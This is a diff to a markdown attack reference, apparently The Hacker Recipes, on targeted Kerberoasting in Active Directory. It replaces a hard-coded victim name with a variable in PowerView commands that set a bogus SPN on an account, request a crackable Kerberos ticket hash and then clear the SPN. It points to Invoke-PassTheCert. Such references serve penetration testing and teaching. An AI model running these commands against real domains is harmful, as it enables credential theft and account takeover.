@@ -31,18 +31,18 @@ From Windows machines, this can be achieved with [Set-DomainObject](https://powe
 
 ```bash
 # Make sur that the target account has no SPN
-Get-DomainUser 'victimuser' | Select serviceprincipalname
+Get-DomainUser $TARGET_USER | Select serviceprincipalname
 
 # Set the SPN
-Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+Set-DomainObject -Identity $TARGET_USER -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 # Obtain a kerberoast hash
-$User = Get-DomainUser 'victimuser'
+$User = Get-DomainUser $TARGET_USER
 $User | Get-DomainSPNTicket | fl
 
 # Clear the SPNs of the target account
 $User | Select serviceprincipalname
-Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+Set-DomainObject -Identity $TARGET_USER -Clear serviceprincipalname
 ```
 
 The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert).
